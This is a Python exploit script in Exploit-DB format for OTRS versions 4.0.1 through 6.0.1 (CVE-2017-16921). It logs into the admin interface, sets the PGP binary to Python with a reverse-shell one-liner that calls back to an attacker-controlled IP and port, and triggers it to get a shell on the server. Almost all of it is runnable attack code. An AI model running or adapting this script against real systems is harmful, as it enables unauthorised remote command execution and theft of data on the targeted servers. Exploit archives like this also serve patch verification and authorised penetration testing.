# Exploit Title: OTRS 6.0.1 - Remote Command Execution (2)
# Date: 21-04-2021
# Exploit Author: Hex_26
# Vendor Homepage: https://www.otrs.com/
# Software Link: http://ftp.otrs.org/pub/otrs/
# Version: 4.0.1 - 4.0.26, 5.0.0 - 5.0.24, 6.0.0 - 6.0.1
# Tested on: OTRS 5.0.2/CentOS 7.2.1511
# CVE : CVE-2017-16921

#!/usr/bin/env python3
"""
Designed after https://www.exploit-db.com/exploits/43853.
Runs a python reverse shell on the target with the preconfigured options.

This script does not start a listener for you. Run one on your own with netcat or another similar tool

By default, this script will launch a python reverse shell one liner with no cleanup. Manual cleanup needs to be done for the PGP options in the admin panel if you wish to preserve full working condition.
"""

import requests;
import sys;

baseuri = "http://172.16.1.158/otrs/index.pl";
username = "root@localhost";
password = "root";
revShellIp = "172.20.1.79";
revShellPort = 9008;

sess = requests.Session();

print("[+] Retrieving auth token...");

data = {"Action":"Login","RequestedURL":"","Lang":"en","TimeOffset":"-480","User":username,"Password":password};

sess.post(baseuri,data=data);

if "OTRSAgentInterface" in sess.cookies.get_dict():
    print("[+] Successfully logged in:");
    print("OTRSAgentInterface",":",sess.cookies.get_dict()["OTRSAgentInterface"]);
else:
    print("[-] Failed to log in. Bad credentials?");
    sys.exit();

print("[+] Grabbing challenge token from PGP panel...");

contents = sess.get(baseuri+"?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework").text;
challTokenStart = contents.find('<input type="hidden" name="ChallengeToken" value="')+50;
challengeToken = contents[challTokenStart:challTokenStart+32];
print("[+]",challengeToken);


print("[+] Enabling PGP keys in config, and setting our malicious command");

settings = {\
"ChallengeToken":challengeToken,\
"Action":"AdminSysConfig",\
"Subaction":"Update",\
"SysConfigGroup":"Framework",\
"SysConfigSubGroup":"Crypt::PGP",\
"DontWriteDefault":"1",\
"PGP":"1",\
"PGP::Bin":"/usr/bin/python",\
"PGP::Options":"-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + revShellIp + "\"," + str(revShellPort) + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",\
"PGP::Key::PasswordKey[]":"488A0B8F",\
"PGP::Key::PasswordContent[]":"SomePassword",\
"PGP::Key::PasswordDeleteNumber[]":"1",\
"PGP::Key::PasswordKey[]":"D2DF79FA",\
"PGP::Key::PasswordContent[]":"SomePassword",\
"PGP::Key::PasswordDeleteNumber[]":"2",\
"PGP::TrustedNetworkItemActive":"1",\
"PGP::TrustedNetwork":"0",\
"PGP::LogKey[]":"BADSIG",\
"PGP::LogContent[]":"The+PGP+signature+with+the+keyid+has+not+been+verified+successfully.",\
"PGP::LogDeleteNumber[]":"1",\
"PGP::LogKey[]":"ERRSIG",\
"PGP::LogContent[]":"It+was+not+possible+to+check+the+PGP+signature%2C+this+may+be+caused+by+a+missing+public+key+or+an+unsupported+algorithm.",\
"PGP::LogDeleteNumber[]":"2",\
"PGP::LogKey[]":"EXPKEYSIG",\
"PGP::LogContent[]":"The+PGP+signature+was+made+by+an+expired+key.",\
"PGP::LogDeleteNumber[]":"3",\
"PGP::LogKey[]":"GOODSIG",\
"PGP::LogContent[]":"Good+PGP+signature.",\
"PGP::LogDeleteNumber[]":"4",\
"PGP::LogKey[]":"KEYREVOKED",\
"PGP::LogContent[]":"The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.",\
"PGP::LogDeleteNumber[]":"5",\
"PGP::LogKey[]":"NODATA",\
"PGP::LogContent[]":"No+valid+OpenPGP+data+found.",\
"PGP::LogDeleteNumber[]":"6",\
"PGP::LogKey[]":"NO_PUBKEY",\
"PGP::LogContent[]":"No+public+key+found.",\
"PGP::LogDeleteNumber[]":"7",\
"PGP::LogKey[]":"REVKEYSIG",\
"PGP::LogContent[]":"The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.",\
"PGP::LogDeleteNumber[]":"8",\
"PGP::LogKey[]":"SIGEXPIRED",\
"PGP::LogContent[]":"The+PGP+signature+is+expired.",\
"PGP::LogDeleteNumber[]":"9",\
"PGP::LogKey[]":"SIG_ID",\
"PGP::LogContent[]":"Signature+data.",\
"PGP::LogDeleteNumber[]":"10",\
"PGP::LogKey[]":"TRUST_UNDEFINED",\
"PGP::LogContent[]":"This+key+is+not+certified+with+a+trusted+signature%21.",\
"PGP::LogDeleteNumber[]":"11",\
"PGP::LogKey[]":"VALIDSIG",\
"PGP::LogContent[]":"The+PGP+signature+with+the+keyid+is+good.",\
"PGP::LogDeleteNumber[]":"12",\
"PGP::StoreDecryptedData":"1"\
};


sess.post(baseuri+"?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework",data=settings);

print("[+] Now attempting to trigger the command. If this hangs, it likely means the reverse shell started.");

sess.get(baseuri+"?Action=AdminPGP");

print("[+] Exploit complete, check your listener for a shell");
            
